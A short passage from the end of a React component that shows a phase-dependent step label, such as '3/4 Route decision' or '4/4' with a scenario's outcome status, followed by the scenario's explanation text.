                  : phase === "route"
                    ? "3/4 Route decision"
                    : `4/4 ${scenario.outcomeStatus}`}
            </span>
          </span>
        </div>

        <p className="text-xs leading-relaxed text-ink-dim">
          {scenario.explanation}
        </p>
      </div>
    </div>
  );
}
